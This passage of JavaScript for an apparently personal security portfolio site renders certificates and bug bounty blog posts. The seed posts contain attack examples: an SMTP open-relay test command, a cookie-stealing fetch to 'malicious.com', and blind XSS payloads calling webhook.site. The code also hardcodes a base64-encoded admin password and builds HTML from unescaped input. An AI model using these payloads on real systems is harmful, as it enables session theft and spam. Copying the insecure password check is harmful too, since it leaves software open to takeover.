            "description": "A certificate of completion for a course on networking fundamentals with Cisco.",
            "full_description": "This certificate, issued by Udemy, confirms the completion of the 'Foundations of Networking with Cisco' course. The instructors are ABM Saheel. Mostafa Galal completed this course on March 3, 2025, and it had a total length of 2 hours.",
            "key_takeaways": "Solid understanding of networking principles and Cisco technologies.",
            "image": "ciscofoundation.jpeg",
            "verification": "https://ude.my/UC-4d3eec222-c900-4d43-8917-b32act2cb7e8",
            "skills": "Networking, Cisco, TCP/IP, Routing, Switching, Network Protocols"
        },
        {
            "name": "Mind Power - Change Your Thought Process To Change Your Life",
            "date": "2025-05-29",
            "description": "A personal development course focused on transforming thought processes for life improvement.",
            "full_description": "This Udemy certificate confirms Mostafa Galal's completion of 'Mind Power - Change Your Thought Process To Change Your Life.' The instructors were Susmita Dutta and Ash Akshay Goel. The course was completed on May 29, 2025, and had a total length of 1.5 hours.",
            "key_takeaways": "Enhanced self-awareness and strategies for positive personal change.",
            "image": "mindpower.jpeg",
            "verification": "https://ude.my/UC-ea72203e-af53-4a6c-86a0-b246a4ff781c",
            "skills": "Self-Improvement, Mindset, Personal Development, Critical Thinking, Positive Thinking"
        },
        {
            "name": "The Complete C & C++ Programming Course - Mastering C & C++",
            "date": "2025-07-05",
            "description": "A comprehensive programming course covering C and C++.",
            "full_description": "This Udemy certificate signifies the completion of 'The Complete C & C++ Programming Course - Mastering C & C++' by Mostafa Galal. The course was instructed by Sara Academy and completed on July 5, 2025, with a total length of 5 hours.",
            "key_takeaways": "In-depth knowledge and practical skills in C and C++ programming.",
            "image": "c&c++programmingcourse.jpeg",
            "verification": "https://ude.my/UC-6a30b6ff-0402-47ec-98a9-50bc698df41d",
            "skills": "C Programming, C++ Programming, Object-Oriented Programming, Data Structures, Algorithms, Pointers, Memory Management"
        },
        {
            "name": "2025 C++ Programming : Beginners to Advanced for Developers",
            "date": "2025-07-05",
            "description": "A comprehensive C++ programming course for developers, covering topics from beginner to advanced levels.",
            "full_description": "This Udemy certificate confirms Mostafa Galal's completion of the '2025 C++ Programming : Beginners to Advanced for Developers' course. The instructors were Toppers Bootcamp. The course was completed on July 5, 2025, and had a total length of 6 hours.",
            "key_takeaways": "In-depth understanding and practical skills in C++ programming for developing various applications.",
            "image": "2025c++programming.jpeg",
            "verification": "https://ude.my/UC-2bbd9aa3-5098-4556-a4e2-7bf9b2f9dc4b",
            "skills": "C++ Programming, Object-Oriented Programming, Data Structures, Algorithms, Memory Management, Software Development, Problem Solving"
        }

    ];
    let blogPostsArray = JSON.parse(localStorage.getItem('blogPostsArray')) || [
        {
            title: "Snapchat SMTP Open Relay Vulnerability",
            date: "2025-05-15",
            content: `During a bug bounty engagement, I discovered an SMTP open relay vulnerability on beta.snappublisher.snapchat.com. This allowed unauthenticated users to send email through Snapchat's infrastructure.

        **Proof-of-Concept Command:**
        \`\`\`bash
        swaks --to recipient@gmail.com --from test@external.com --server beta.snappublisher.snapchat.com
        \`\`\`

        The server relayed the message, confirming the vulnerability. I reported this to Snapchat with a video PoC and recommended restricting SMTP relay to authenticated users only.

        **Impact:**
        This vulnerability could be used for phishing or spam campaigns, risking brand reputation.

        **Recon Tools Used:** Subfinder, httpx, swaks

        **Key Takeaway:** Demonstrated practical bug bounty workflow, recon-to-reporting, and SMTP misconfiguration exploitation.`,
            tags: "SMTP, Bug Bounty, Email Security, Reconnaissance"
        },
        {
            title: "Grammarly CSRF and XSS Investigation (CTF)",
            date: "2025-06-01",
            content: `In a Grammarly CTF, I identified a CSRF token leakage vulnerability where unauthenticated users received tokens in responses.

        **Example Exploit:**
        \`\`\`js
        fetch("https://malicious.com/steal?token=" + document.cookie);
        \`\`\`

        I also attempted blind XSS using:
        \`\`\`html
        &lt;script&gt;fetch("https://webhook.site/your-token")&lt;/script&gt;
        \`\`\`

        Tools like Dalfox and XSStrike helped automate testing, though XSS payloads failed due to strong filtering.

        **Recon Tools:** Subfinder, httpx

        **Conclusion:** Reported the CSRF issue to Grammarly. No XSS hits, indicating strong defenses.

        **Key Takeaway:** Practiced real-world vulnerability enumeration and bug bounty methodology in a CTF context.`,
            tags: "CTF, CSRF, XSS, Bug Bounty"
        },
        {
            title: "Webhook Testing for Blind XSS",
            date: "2025-05-22",
            content: `Tested for blind XSS on a target by injecting payloads with webhook monitoring:

        **Payloads Used:**
        - &lt;img src=x onerror=alert(document.domain)&gt;
        - &lt;script&gt;fetch('https://webhook.site/your-token')&lt;/script&gt;

        Initial hits confirmed vulnerability. Later hits stopped, likely due to WAF or rate-limiting. I diversified payloads and tested with Dalfox and XSStrike.

        **Recon Tools:** Subfinder + httpx

        **Takeaway:** Blind XSS requires adaptive payloads and evasion. Consistent recon is crucial to discover exploitable surfaces.`,
            tags: "XSS, Webhook, WAF Evasion, Blind XSS, Recon"
        },
        {
            title: "My Journey into Red Teaming",
            date: "2025-05-20",
            content: `Embarking on a red teaming journey has been exhilarating and challenging. Unlike traditional penetration testing, red teaming focuses on simulating real-world attacks to test an organization's overall security posture, including its people, processes, and technology.

My initial steps involved mastering reconnaissance techniques, from open-source intelligence (OSINT) to network mapping. Understanding the target's digital footprint is paramount. I quickly realized the importance of stealth and evasion, as detection means mission failure.

**Key Challenges:**
- **Staying Undetected:** Bypassing EDRs, antivirus, and network defenses requires constant adaptation.
- **Payload Development:** Crafting custom, polymorphic payloads that can evade detection without triggering alerts.
- **Social Engineering:** The human element is often the weakest link. Developing believable pretexts and effective communication strategies is an art.

Red teaming is a continuous learning curve, pushing the boundaries of offensive security.`,
            tags: "Red Teaming, Offensive Security, Career, Learning"
        }
    ];


    // Render content on page load (after preloader)
    document.addEventListener('DOMContentLoaded', () => {
        renderProjects();
        renderCertificates();
        renderBlogPosts();
    });


    // --- Modal Management ---
    function openModal(modalElement) {
        document.querySelector('.main-content-area').classList.add('modal-open');
        modalElement.style.display = "flex";
        setTimeout(() => modalElement.classList.add('show'), 10); // allow display change to register before transitioning
    }

    function closeModal(modalElement) {
        document.querySelector('.main-content-area').classList.remove('modal-open');
        modalElement.classList.remove('show');
        setTimeout(() => modalElement.style.display = "none", 300); // Wait for transition to finish
    }
    
    // --- Password Protection ---
    const adminPassword = "MTIzNTc4OTUx"; 
    let requestedAction = null;

    addCardBtn.addEventListener('click', () => {
        requestedAction = 'add';
        openModal(passwordModal);
        passwordInput.focus();
    });

    editCardBtn.addEventListener('click', () => {
        requestedAction = 'edit';
        openModal(passwordModal);
        passwordInput.focus();
    });
    
    removeCardBtn.addEventListener('click', () => {
        requestedAction = 'remove';
        openModal(passwordModal);
        passwordInput.focus();
    });
    
    passwordClose.addEventListener('click', () => closeModal(passwordModal));
    
    passwordSubmit.addEventListener('click', () => {
        if (btoa(passwordInput.value) === adminPassword) {
            closeModal(passwordModal);
            passwordInput.value = '';
            passwordError.style.display = 'none';
            if (requestedAction === 'add') {
                openModal(addCardModal);
                showTab('project');
            } else if (requestedAction === 'remove') {
                showRemoveCardModal();
            } else if (requestedAction === 'edit') {
                showEditCardModal();
            }
        } else {
            passwordError.style.display = 'block';
            passwordInput.value = '';
        }
    });
    
    passwordInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            passwordSubmit.click();
        }
    });


    // Close Modals
    addCardCloseBtn.addEventListener('click', () => closeModal(addCardModal));
    removeCardCloseBtn.addEventListener('click', () => closeModal(removeCardModal));
    detailModalCloseBtn.addEventListener('click', () => closeModal(detailModal));
    blogDetailModalCloseBtn.addEventListener('click', () => closeModal(blogDetailModal));
    editCardCloseBtn.addEventListener('click', () => closeModal(editCardModal));


    // Tab logic for Add Card modal
    function showTab(tabName) {
        const tabs = {
            'project': { btn: tabProjectBtn, content: addProjectTab },
            'certificate': { btn: tabCertificateBtn, content: addCertificateTab },
            'blog': { btn: tabBlogBtn, content: addBlogTab }
        };

        for (const key in tabs) {
            if (key === tabName) {
                tabs[key].btn.classList.add('active');
                tabs[key].content.classList.add('active');
            } else {
                tabs[key].btn.classList.remove('active');
                tabs[key].content.classList.remove('active');
            }
        }
    }
    tabProjectBtn.addEventListener('click', () => showTab('project'));
    tabCertificateBtn.addEventListener('click', () => showTab('certificate'));
    tabBlogBtn.addEventListener('click', () => showTab('blog'));

    // --- Add New Project/Certificate/Blog Post ---
    addProjectBtnModal.addEventListener('click', () => {
      const projectName = document.getElementById('project-name').value.trim();
      const projectDescription = document.getElementById('project-description').value.trim();
      const projectFullDescription = document.getElementById('project-full-description').value.trim();
      const projectChallenges = document.getElementById('project-challenges').value.trim();
      const projectImpact = document.getElementById('project-impact').value.trim();
      const projectTakeaways = document.getElementById('project-takeaways').value.trim();
      const projectImage = document.getElementById('project-image').value.trim();
      const projectVideo = document.getElementById('project-video').value.trim();
      const projectTech = document.getElementById('project-tech').value.trim();
      const projectGithub = document.getElementById('project-github').value.trim();
      const projectDemo = document.getElementById('project-demo').value.trim();

      if (projectName && projectDescription) {
          const newProject = {
            name: projectName,
            date: new Date().toISOString().split('T')[0], 
            description: projectDescription,
            full_description: projectFullDescription || projectDescription, 
            challenges_faced: projectChallenges,
            impact_achieved: projectImpact,
            key_takeaways: projectTakeaways,
            image: projectImage,
            video: projectVideo,
            tech: projectTech,
            github: projectGithub,
            demo: projectDemo
          };
          projectsArray.push(newProject);
          localStorage.setItem('projectsArray', JSON.stringify(projectsArray));
          renderProjects();
          playBeep();
          closeModal(addCardModal);
      } else {
        alert("Project Name and Description are required!");
      }
    });

    addCertificateBtnModal.addEventListener('click', () => {
      const certificateName = document.getElementById('certificate-name').value.trim();
      const certificateDescription = document.getElementById('certificate-description').value.trim();
      const certificateFullDescription = document.getElementById('certificate-full-description').value.trim();
      const certificateImpact = document.getElementById('certificate-impact').value.trim();
      const certificateTakeaways = document.getElementById('certificate-takeaways').value.trim();
      const certificateImage = document.getElementById('certificate-image').value.trim();
      const certificateVerification = document.getElementById('certificate-verification').value.trim();
      const certificateSkills = document.getElementById('certificate-skills').value.trim();

      if (certificateName && certificateDescription) {
          const newCertificate = {
            name: certificateName,
            date: new Date().toISOString().split('T')[0],
            description: certificateDescription,
            full_description: certificateFullDescription || certificateDescription,
            impact_achieved: certificateImpact,
            key_takeaways: certificateTakeaways,
            image: certificateImage,
            verification: certificateVerification,
            skills: certificateSkills
          };
          certificatesArray.push(newCertificate);
          localStorage.setItem('certificatesArray', JSON.stringify(certificatesArray));
          renderCertificates();
          playBeep();
          closeModal(addCardModal);
      } else {
        alert("Certificate Name and Description are required!");
      }
    });

    addBlogBtnModal.addEventListener('click', () => {
        const blogTitle = document.getElementById('blog-title').value.trim();
        const blogDate = document.getElementById('blog-date').value.trim();
        const blogContent = document.getElementById('blog-content').value.trim();
        const blogTags = document.getElementById('blog-tags').value.trim();

        if (blogTitle && blogDate && blogContent) {
            const newBlogPost = {
                title: blogTitle,
                date: blogDate,
                content: blogContent,
                tags: blogTags
            };
            blogPostsArray.push(newBlogPost);
            localStorage.setItem('blogPostsArray', JSON.stringify(blogPostsArray));
            renderBlogPosts();
            playBeep();
            closeModal(addCardModal);
        } else {
            alert("Blog Title, Date, and Content are required!");
        }
    });

    // --- Function to initialize 3D tilt effect on cards ---
    function initTiltEffect() {
        const cards = document.querySelectorAll('.custom-card');
        cards.forEach(card => {
            card.addEventListener('mousemove', (e) => {
                const rect = card.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                const { width, height } = rect;
                const rotateX = (y / height - 0.5) * -15; // Max rotation 7.5 deg
                const rotateY = (x / width - 0.5) * 15; // Max rotation 7.5 deg
                card.style.transform = `rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
            });
            card.addEventListener('mouseleave', () => {
                card.style.transform = 'rotateX(0) rotateY(0)';
            });
        });
    }

    // --- Render Projects/Certificates/Blog Posts ---
    function renderProjects(filterText = '') {
      projectsContainer.innerHTML = "";
      const filteredProjects = projectsArray.filter(project => {
          const searchLower = filterText.toLowerCase();
          return project.name.toLowerCase().includes(searchLower) ||
                 project.description.toLowerCase().includes(searchLower) ||
                 (project.tech && project.tech.toLowerCase().includes(searchLower));
      });

      if (filteredProjects.length === 0 && filterText) {
          projectsContainer.innerHTML = "<p style='text-align:center; color: #aaa; grid-column: 1 / -1;'>No projects found matching your search.</p>";
          return;
      }

      filteredProjects.forEach((project, index) => {
        const projectCard = document.createElement('div');
        projectCard.className = "custom-card";

        const imageHtml = project.image ? `<img src="${project.image}" alt="${project.name}" loading="lazy" onerror="this.onerror=null;this.src='https://placehold.co/400x200/ff1b1b/FFFFFF?text=Image+Error';">` : "";
        const techTags = project.tech ? project.tech.split(',').map(tag => `<span>${tag.trim()}</span>`).join('') : '';

        projectCard.innerHTML = `
          <div class="card-preview">
            <span class="card-type-label">Project</span>
            <h3>${project.name}</h3>
            ${imageHtml}
          </div>
          <div class="card-info">
            <p>${project.description}</p>
            ${techTags ? `<div class="tech-list">${techTags}</div>` : ''}
            <div class="card-footer">
                <span class="card-date">${project.date}</span>
                <a class="gradient-button small view-details" data-type="project" data-index="${projectsArray.indexOf(project)}">Details</a>
            </div>
          </div>
        `;
        projectsContainer.appendChild(projectCard);
      });
      initTiltEffect(); 
    }

    function renderCertificates(filterText = '') {
      certificatesContainer.innerHTML = "";
      const filteredCertificates = certificatesArray.filter(cert => {
          const searchLower = filterText.toLowerCase();
          return cert.name.toLowerCase().includes(searchLower) ||
                 cert.description.toLowerCase().includes(searchLower) ||
                 (cert.skills && cert.skills.toLowerCase().includes(searchLower));
      });

      if (filteredCertificates.length === 0 && filterText) {
          certificatesContainer.innerHTML = "<p style='text-align:center; color: #aaa; grid-column: 1 / -1;'>No certificates found matching your search.</p>";
          return;
      }

      filteredCertificates.forEach((certificate, index) => {
        const certificateCard = document.createElement('div');
        certificateCard.className = "custom-card";

        const imageHtml = certificate.image ? `<img src="${certificate.image}" alt="${certificate.name}" loading="lazy" onerror="this.onerror=null;this.src='https://placehold.co/400x200/ff1b1b/FFFFFF?text=Image+Error';">` : "";
        const skillsTags = certificate.skills ? certificate.skills.split(',').map(tag => `<span>${tag.trim()}</span>`).join('') : '';

        certificateCard.innerHTML = `
          <div class="card-preview">
            <span class="card-type-label">Certificate</span>
            <h3>${certificate.name}</h3>
            ${imageHtml}
          </div>
          <div class="card-info">
            <p>${certificate.description}</p>
            ${skillsTags ? `<div class="tech-list">${skillsTags}</div>` : ''}
            <div class="card-footer">
                <span class="card-date">${certificate.date}</span>
                <a class="gradient-button small view-details" data-type="certificate" data-index="${certificatesArray.indexOf(certificate)}">Details</a>
            </div>
          </div>
        `;
        certificatesContainer.appendChild(certificateCard);
      });
      initTiltEffect(); 
    }

    function renderBlogPosts(filterText = '') {
        blogContainer.innerHTML = "";
        const filteredBlogPosts = blogPostsArray.filter(post => {
            const searchLower = filterText.toLowerCase();
            return post.title.toLowerCase().includes(searchLower) ||
                   post.content.toLowerCase().includes(searchLower) ||
                   (post.tags && post.tags.toLowerCase().includes(searchLower));
        });

        if (filteredBlogPosts.length === 0 && filterText) {
            blogContainer.innerHTML = "<p style='text-align:center; color: #aaa; grid-column: 1 / -1;'>No blog posts found matching your search.</p>";
            return;
        }

        filteredBlogPosts.forEach((post, index) => {
            const blogPostCard = document.createElement('div');
            blogPostCard.className = "custom-card";
            const tagsHtml = post.tags ? post.tags.split(',').map(tag => `<span>${tag.trim()}</span>`).join('') : '';

            blogPostCard.innerHTML = `
                <div class="card-preview">
                    <span class="card-type-label">Blog Post</span>
                    <h3>${post.title}</h3>
                </div>
                <div class="card-info">
                    <p>${post.content.substring(0, 150)}${post.content.length > 150 ? '...' : ''}</p>
                    ${tagsHtml ? `<div class="tech-list">${tagsHtml}</div>` : ''}
                    <div class="card-footer">
                        <span class="card-date">${post.date}</span>
                        <a class="gradient-button small view-details" data-type="blog" data-index="${blogPostsArray.indexOf(post)}">Read More</a>
                    </div>
                </div>
            `;
            blogContainer.appendChild(blogPostCard);
        });
        initTiltEffect(); 
    }

    // --- Search Input Event Listeners ---
    document.getElementById('project-search').addEventListener('keyup', (event) => {
        renderProjects(event.target.value);
    });
    document.getElementById('certificate-search').addEventListener('keyup', (event) => {
        renderCertificates(event.target.value);
    });
    document.getElementById('blog-search').addEventListener('keyup', (event) => {
        renderBlogPosts(event.target.value);
    });
    
    // --- Universal Detail Button Click Handler ---
    document.getElementById('main-content').addEventListener('click', (event) => {
        if (event.target.matches('.view-details')) {
            const type = event.target.dataset.type;
            const index = parseInt(event.target.dataset.index);
            
            if (type === 'project') {
                displayProjectModal(projectsArray[index]);
            } else if (type === 'certificate') {
                displayCertificateModal(certificatesArray[index]);
            } else if (type === 'blog') {
                displayBlogModal(blogPostsArray[index]);
            }
        }
    });


    // --- Detail Modals (Project/Certificate/Blog) ---
    function displayProjectModal(project) {
        detailTitle.textContent = project.name;
        detailDescription.textContent = project.full_description || project.description; 
        detailMediaContainer.innerHTML = '';
        detailLinks.innerHTML = '';
        detailSkills.innerHTML = '';
        detailChallenges.innerHTML = '';
        detailImpact.innerHTML = '';
        detailTakeaways.innerHTML = '';

        if (project.video) {
            detailMediaContainer.innerHTML = `<video controls class="modal-media" loading="lazy" onerror="this.onerror=null;this.src='https://placehold.co/400x300/ff1b1b/FFFFFF?text=Video+Error';"><source src="${project.video}" type="video/mp4">Your browser does not support the video tag.</video>`;
        } else if (project.image) {
            detailMediaContainer.innerHTML = `<img src="${project.image}" alt="${project.name}" class="modal-media" loading="lazy" onerror="this.onerror=null;this.src='https://placehold.co/400x300/ff1b1b/FFFFFF?text=Image+Error';">`;
        }

        if (project.github) {
            detailLinks.innerHTML += `<a href="${project.github}" target="_blank" class="gradient-button small">GitHub</a>`;
        }
        if (project.demo) {
            detailLinks.innerHTML += `<a href="${project.demo}" target="_blank" class="gradient-button small">Live Demo</a>`;
        }

        if (project.tech) {
            detailSkills.innerHTML += `<strong>Technologies:</strong> `;
            project.tech.split(',').map(s => s.trim()).filter(s => s).forEach(skill => {
                detailSkills.innerHTML += `<span>${skill}</span>`;
            });
        }
        if (project.challenges_faced) {
            detailChallenges.innerHTML = `<strong>Challenges:</strong> ${project.challenges_faced}`;
        }
        if (project.impact_achieved) {
            detailImpact.innerHTML = `<strong>Impact:</strong> ${project.impact_achieved}`;
        }
        if (project.key_takeaways) {
            detailTakeaways.innerHTML = `<strong>Key Takeaways:</strong> ${project.key_takeaways}`;
        }

        openModal(detailModal);
    }

    function displayCertificateModal(certificate) {
        detailTitle.textContent = certificate.name;
        detailDescription.textContent = certificate.full_description || certificate.description;
        detailMediaContainer.innerHTML = '';
        detailLinks.innerHTML = '';
        detailSkills.innerHTML = '';
        detailChallenges.innerHTML = ''; 
        detailImpact.innerHTML = '';
        detailTakeaways.innerHTML = '';

        if (certificate.image) {
            detailMediaContainer.innerHTML = `<img src="${certificate.image}" alt="${certificate.name}" class="modal-media" loading="lazy" onerror="this.onerror=null;this.src='https://placehold.co/400x300/ff1b1b/FFFFFF?text=Image+Error';">`;
        }

        if (certificate.verification) {
            detailLinks.innerHTML += `<a href="${certificate.verification}" target="_blank" class="gradient-button small">Verify</a>`;
        }

        if (certificate.skills) {
            detailSkills.innerHTML += `<strong>Skills Gained:</strong> `;
            certificate.skills.split(',').map(s => s.trim()).filter(s => s).forEach(skill => {
                detailSkills.innerHTML += `<span>${skill}</span>`;
            });
        }
        if (certificate.impact_achieved) { 
            detailImpact.innerHTML = `<strong>Relevance/Impact:</strong> ${certificate.impact_achieved}`;
        }
        if (certificate.key_takeaways) {
            detailTakeaways.innerHTML = `<strong>Key Takeaways:</strong> ${certificate.key_takeaways}`;
        }
        openModal(detailModal);
    }

    function displayBlogModal(post) {
        blogDetailTitle.textContent = post.title;
        blogDetailMeta.textContent = `> Published: ${post.date}`;
        blogFullContent.textContent = post.content;
        blogDetailTags.innerHTML = `<strong>Tags:</strong> `;
        if (post.tags) {
            post.tags.split(',').map(s => s.trim()).filter(s => s).forEach(tag => {
                blogDetailTags.innerHTML += `<span>${tag}</span>`;
            });
        }
        openModal(blogDetailModal);
    }

    // --- Remove Card Logic ---
    function showRemoveCardModal() {
      cardList.innerHTML = ""; 

      projectsArray.forEach((project, index) => {
        const cardItem = document.createElement('div');
        cardItem.className = "card-item";
        cardItem.innerHTML = `
          <input type="checkbox" id="project-remove-${index}" data-type="project" data-index="${index}">
          <label for="project-remove-${index}">Project: ${project.name}</label>
        `;
        cardList.appendChild(cardItem);
      });

      certificatesArray.forEach((certificate, index) => {
        const cardItem = document.createElement('div');
        cardItem.className = "card-item";
        cardItem.innerHTML = `
          <input type="checkbox" id="certificate-remove-${index}" data-type="certificate" data-index="${index}">
          <label for="certificate-remove-${index}">Certificate: ${certificate.name}</label>
        `;
        cardList.appendChild(cardItem);
      });

      blogPostsArray.forEach((post, index) => {
        const cardItem = document.createElement('div');
        cardItem.className = "card-item";
        cardItem.innerHTML = `
          <input type="checkbox" id="blog-remove-${index}" data-type="blog" data-index="${index}">
          <label for="blog-remove-${index}">Blog: ${post.title}</label>
        `;
        cardList.appendChild(cardItem);
      });

      if (projectsArray.length === 0 && certificatesArray.length === 0 && blogPostsArray.length === 0) {
          cardList.innerHTML = "<p style='text-align:center; opacity:0.7;'>No items to remove.</p>";
          confirmRemoveBtn.disabled = true; 
      } else {
          confirmRemoveBtn.disabled = false;
      }

      openModal(removeCardModal);
    }

    confirmRemoveBtn.addEventListener('click', () => {
      const selectedCards = document.querySelectorAll('#remove-card-modal input[type="checkbox"]:checked');

      if (selectedCards.length === 0) {
        alert("No cards selected for removal.");
        return;
      }

      const selectedProjectsIndices = [];
      const selectedCertificatesIndices = [];
      const selectedBlogPostsIndices = [];

      selectedCards.forEach(card => {
        const type = card.getAttribute('data-type');
        const index = parseInt(card.getAttribute('data-index'));

        if (type === "project") {
          selectedProjectsIndices.push(index);
        } else if (type === "certificate") {
          selectedCertificatesIndices.push(index);
        } else if (type === "blog") {
          selectedBlogPostsIndices.push(index);
        }
      });

      selectedProjectsIndices.sort((a, b) => b - a).forEach(index => {
        projectsArray.splice(index, 1);
      });
      selectedCertificatesIndices.sort((a, b) => b - a).forEach(index => {
        certificatesArray.splice(index, 1);
      });
      selectedBlogPostsIndices.sort((a, b) => b - a).forEach(index => {
        blogPostsArray.splice(index, 1);
      });

      localStorage.setItem('projectsArray', JSON.stringify(projectsArray));
      localStorage.setItem('certificatesArray', JSON.stringify(certificatesArray));
      localStorage.setItem('blogPostsArray', JSON.stringify(blogPostsArray));

      renderProjects();
      renderCertificates();
      renderBlogPosts();
      playBeep();
      closeModal(removeCardModal);
    });

    // --- NEW: Edit Card Modal Logic ---
    
    function showEditCardModal() {
        // Default to the 'project' tab
        switchEditTab('project');
        openModal(editCardModal);
    }

    function switchEditTab(type) {
        // Update active tab button
        document.querySelectorAll('#edit-card-modal .tab-buttons button').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.type === type);
        });
        
        // Hide form until a card is selected
        cardEditorForm.style.display = 'none';
        
        // Populate the draggable list
        populateDraggableList(type);
    }

    function getArrayForType(type) {
        if (type === 'project') return projectsArray;
        if (type === 'certificate') return certificatesArray;
        if (type === 'blog') return blogPostsArray;
        return [];
    }

    function populateDraggableList(type) {
        editCardList.innerHTML = '';
        const items = getArrayForType(type);
        
        items.forEach((item, index) => {
            const listItem = document.createElement('div');
            listItem.className = 'draggable-card-item';
            listItem.draggable = true;
            listItem.dataset.index = index;
            listItem.dataset.type = type;
            listItem.innerHTML = `
                <span>${item.name || item.title}</span>
                <i class="fas fa-edit"></i>
            `;
            editCardList.appendChild(listItem);
        });
    }

    // Event listeners for edit modal tabs
    document.getElementById('edit-tab-project-btn').addEventListener('click', () => switchEditTab('project'));
    document.getElementById('edit-tab-certificate-btn').addEventListener('click', () => switchEditTab('certificate'));
    document.getElementById('edit-tab-blog-btn').addEventListener('click', () => switchEditTab('blog'));

    // Event listener for selecting a card to edit
    editCardList.addEventListener('click', (e) => {
        const item = e.target.closest('.draggable-card-item');
        if (item) {
            const type = item.dataset.type;
            const index = parseInt(item.dataset.index);
            
            // Highlight selected item
            document.querySelectorAll('.draggable-card-item.selected').forEach(el => el.classList.remove('selected'));
            item.classList.add('selected');

            loadCardIntoEditor(type, index);
        }
    });

    function loadCardIntoEditor(type, index) {
        const item = getArrayForType(type)[index];
        if (!item) return;

        // Store snapshot for undo
        currentEditSnapshot = { type, index, data: JSON.parse(JSON.stringify(item)) };
        document.getElementById('undo-card-changes-btn').disabled = false;

        cardEditorForm.style.display = 'block';
        
        // Populate common fields
        document.getElementById('edit-card-type').value = type;
        document.getElementById('edit-card-original-index').value = index;
        document.getElementById('edit-card-name').value = item.name || item.title || '';
        document.getElementById('edit-card-description').value = item.description || '';
        document.getElementById('edit-card-full-description').value = item.full_description || item.content || '';
        document.getElementById('edit-card-image').value = item.image || '';
        
        // Populate type-specific fields
        const projectLinks = document.getElementById('project-links-container');
        const certLinks = document.getElementById('certificate-links-container');
        const techLabel = document.querySelector('label[for="edit-card-tech"]');

        projectLinks.style.display = 'none';
        certLinks.style.display = 'none';

        if (type === 'project') {
            projectLinks.style.display = 'block';
            techLabel.textContent = 'Technologies (comma-separated)';
            document.getElementById('edit-card-tech').value = item.tech || '';
            document.getElementById('edit-card-github').value = item.github || '';
            document.getElementById('edit-card-demo').value = item.demo || '';
        } else if (type === 'certificate') {
            certLinks.style.display = 'block';
            techLabel.textContent = 'Skills Gained (comma-separated)';
            document.getElementById('edit-card-tech').value = item.skills || '';
            document.getElementById('edit-card-verification').value = item.verification || '';
        } else if (type === 'blog') {
            techLabel.textContent = 'Tags (comma-separated)';
            document.getElementById('edit-card-tech').value = item.tags || '';
        }

        updateLivePreview();
    }

    // Live Preview Logic
    document.querySelectorAll('#card-editor-form input, #card-editor-form textarea').forEach(input => {
        input.addEventListener('keyup', updateLivePreview);
        input.addEventListener('change', updateLivePreview);
    });

    function updateLivePreview() {
        const previewContainer = document.getElementById('live-preview-container');
        const type = document.getElementById('edit-card-type').value;
        if (!type) {
            previewContainer.innerHTML = '<h3>Live Preview</h3><p>Select a card to see a preview.</p>';
            return;
        }

        const name = document.getElementById('edit-card-name').value;
        const description = document.getElementById('edit-card-description').value;
        const image = document.getElementById('edit-card-image').value;
        const tech = document.getElementById('edit-card-tech').value;
        
        const techTags = tech ? tech.split(',').map(tag => `<span>${tag.trim()}</span>`).join('') : '';
        const imageHtml = image ? `<img src="${image}" alt="Preview" onerror="this.style.display='none'">` : '';

        const cardHTML = `
            <h3>Live Preview</h3>
            <div class="custom-card" style="transform: none; box-shadow: 0 0 20px var(--primary-cyan);">
                <div class="card-preview">
                    <span class="card-type-label">${type}</span>
                    <h3>${name}</h3>
                    ${imageHtml}
                </div>
                <div class="card-info">
                    <p>${description}</p>
                    ${techTags ? `<div class="tech-list">${techTags}</div>` : ''}
                </div>
            </div>
        `;
        previewContainer.innerHTML = cardHTML;
    }
    
    // Image Upload to Base64
    document.getElementById('edit-card-image-upload').addEventListener('change', function(event) {
        const file = event.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById('edit-card-image').value = e.target.result;
                updateLivePreview();
            };
            reader.readAsDataURL(file);
        }
    });

    // Save Changes Logic
    document.getElementById('save-card-changes-btn').addEventListener('click', () => {
        const type = document.getElementById('edit-card-type').value;
        const index = parseInt(document.getElementById('edit-card-original-index').value);
        const array = getArrayForType(type);

        if (!type || isNaN(index) || !array[index]) {
            alert('Error: No card selected or card data is invalid.');
            return;
        }

        const item = array[index];

        // Update common fields
        item.description = document.getElementById('edit-card-description').value;
        item.image = document.getElementById('edit-card-image').value;
        
        // Update type-specific fields
        if (type === 'project') {
            item.name = document.getElementById('edit-card-name').value;
            item.full_description = document.getElementById('edit-card-full-description').value;
            item.tech = document.getElementById('edit-card-tech').value;
            item.github = document.getElementById('edit-card-github').value;
            item.demo = document.getElementById('edit-card-demo').value;
        } else if (type === 'certificate') {
            item.name = document.getElementById('edit-card-name').value;
            item.full_description = document.getElementById('edit-card-full-description').value;
            item.skills = document.getElementById('edit-card-tech').value;
            item.verification = document.getElementById('edit-card-verification').value;
        } else if (type === 'blog') {
            item.title = document.getElementById('edit-card-name').value;
            item.content = document.getElementById('edit-card-full-description').value;
            item.tags = document.getElementById('edit-card-tech').value;
        }
        
        // Save to localStorage and re-render
        localStorage.setItem(`${type}sArray`, JSON.stringify(array));
        renderAllCards();
        playBeep();
        alert('Changes saved successfully!');
    });
    
    // Undo Changes Logic
    document.getElementById('undo-card-changes-btn').addEventListener('click', () => {
        if (currentEditSnapshot) {
            const { type, index, data } = currentEditSnapshot;
            const array = getArrayForType(type);
            array[index] = data; // Restore the original data
            
            // Reload the restored data into the editor
            loadCardIntoEditor(type, index);
            
            // Save to localStorage and re-render
            localStorage.setItem(`${type}sArray`, JSON.stringify(array));
            renderAllCards();
            playBeep();
            alert('Changes have been undone.');
        }
    });

    // Drag and Drop Reordering
    let draggedItem = null;

    editCardList.addEventListener('dragstart', (e) => {
        draggedItem = e.target;
        setTimeout(() => {
            e.target.classList.add('dragging');
        }, 0);
    });

    editCardList.addEventListener('dragend', (e) => {
        e.target.classList.remove('dragging');
        saveCardOrder(e.target.dataset.type);
    });

    editCardList.addEventListener('dragover', (e) => {
        e.preventDefault();
        const afterElement = getDragAfterElement(editCardList, e.clientY);
        const container = editCardList;
        if (afterElement == null) {
            container.appendChild(draggedItem);
        } else {
            container.insertBefore(draggedItem, afterElement);
        }
    });

    function getDragAfterElement(container, y) {
        const draggableElements = [...container.querySelectorAll('.draggable-card-item:not(.dragging)')];
        return draggableElements.reduce((closest, child) => {
            const box = child.getBoundingClientRect();
            const offset = y - box.top - box.height / 2;
            if (offset < 0 && offset > closest.offset) {
                return { offset: offset, element: child };
            } else {
                return closest;
            }
        }, { offset: Number.NEGATIVE_INFINITY }).element;
